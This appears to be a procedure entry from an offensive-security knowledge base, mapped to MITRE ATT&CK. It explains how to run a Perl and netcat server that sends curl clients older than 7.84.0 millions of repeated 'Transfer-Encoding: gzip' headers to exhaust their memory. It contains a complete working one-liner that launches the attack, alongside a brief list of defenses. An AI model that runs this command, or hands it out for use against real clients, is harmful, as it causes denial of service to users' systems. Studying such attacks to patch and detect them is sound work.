---
id: proc-setup-malicious-server
tags:
  - dos
  - http-server
  - perl
  - netcat
type: procedure
tools:
  - '[[tools/perl]]'
  - '[[tools/nc]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/perl-malicious-http-server]]'
verified: false
platforms:
  - Linux
  - macOS
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:26:37.305Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[OS Exhaustion Flood]]'
---
# Set-Up-Malicious-HTTP-Server-for-curl-DoS

## Summary

This procedure sets up a local HTTP server using Perl and netcat to serve a malicious response with millions of repeated Transfer-Encoding: gzip headers, exploiting curl's lack of limits on header processing for denial-of-service.

## Description

The attack targets curl's HTTP header parsing, where repeated compression directives like 'Transfer-Encoding: gzip,gzip,...' cause curl to allocate excessive memory during decompression attempts. This simulates a real-world scenario where a malicious server responds to curl requests with crafted headers, leading to client-side resource exhaustion. Prerequisites include Perl and netcat installed; the server runs locally on port 9999 and generates a response that can reach gigabytes in size, triggering out-of-memory conditions.

## Requirements

1. Perl interpreter installed
2. Netcat (nc) utility available
3. Local execution privileges to bind to port 9999
4. Vulnerable curl version (pre-7.84.0)

## Defense

Defensive measures and detection strategies:

- Update curl to version 7.84.0 or later to include header size limits
- Monitor for unusual memory usage in curl processes (e.g., via ps or top)
- Implement proxy-level header validation to throttle repeated encodings
- Use network intrusion detection to flag abnormal HTTP header volumes

## Objectives

1. Generate and serve a massive HTTP response with repeated compression headers
2. Simulate a malicious server for client-side DoS testing
3. Prepare for triggering curl's resource exhaustion

## Instructions

### Step 1: Launch the Malicious Server

**Context**: Use a Perl one-liner piped to netcat to create an HTTP server that outputs an HTTP 200 response followed by 10 million lines of repeated 'Transfer-Encoding: gzip,' headers (20,000 repetitions per line).

**Command** ([[commands/perl-malicious-http-server]]):
```bash
perl -e 'print "HTTP/1.1 200 OK\r\n";for (my $i=0; $i < 10000000; $i++) {  printf "Transfer-Encoding: " . "gzip," x 20000 . "\r\n"; }' | nc -v -l -p 9999
```

> This command starts netcat in listen mode on port 9999, receiving the Perl-generated output. Upon a client connection (e.g., from curl), it serves the enormous header block, causing the client to process it indefinitely.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[OS Exhaustion Flood]]

### Sub-Techniques


## Commands Used

- [[commands/perl-malicious-http-server]]

## Tools Used

- [[tools/perl]]
- [[tools/nc]]

## Tags

- [[dos]]
- [[http-server]]
- [[tools/perl]]
- [[netcat]]
